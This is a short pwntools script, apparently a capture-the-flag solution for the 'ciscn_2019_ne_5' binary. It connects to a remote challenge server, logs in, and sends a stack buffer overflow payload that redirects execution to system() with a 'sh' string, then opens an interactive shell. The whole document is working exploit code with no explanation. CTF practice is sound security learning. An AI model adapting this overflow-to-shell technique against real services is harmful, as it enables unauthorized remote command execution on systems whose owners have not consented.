from pwn import *


#sh = process("./ciscn_2019_ne_5")
sh = remote("node5.buuoj.cn",27952)
elf = ELF("./ciscn_2019_ne_5")

shell = 0x080482ea
system = 0x80484D0

sh.recvuntil(b"password:")
sh.sendline(b"administrator")
sh.recvuntil(b"0.Exit\n:")
sh.sendline(str(1))

sh.recvuntil(b"info:")

payload1 = b"A"*(0x48+4)+p32(system)+b"1234"+p32(shell)
sh.sendline(payload1)

sh.recvuntil(b"0.Exit\n:")

sh.sendline('4')

sh.interactive()
